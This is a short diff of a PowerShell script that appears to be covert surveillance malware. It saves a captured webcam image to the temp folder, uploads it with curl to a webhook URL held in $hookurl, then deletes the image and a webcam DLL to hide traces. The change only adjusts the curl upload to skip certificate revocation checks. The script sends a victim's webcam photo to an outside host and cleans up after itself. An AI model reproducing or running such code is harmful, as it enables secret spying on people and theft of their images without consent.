@@ -21,7 +21,7 @@ $tempDir = [System.IO.Path]::GetTempPath()
 $imagePath = Join-Path -Path $tempDir -ChildPath "webcam_image.jpg"
 [System.IO.File]::WriteAllBytes($imagePath, $imageBytes)
 sleep 1
-curl.exe -F "file1=@$imagePath" $hookurl | Out-Null
+curl.exe --ssl-no-revoke -F "file1=@$imagePath" $hookurl | Out-Null
 sleep 1
 Remove-Item -Path "$env:TEMP\webcam.dll"
 Remove-Item -Path $imagePath -Force
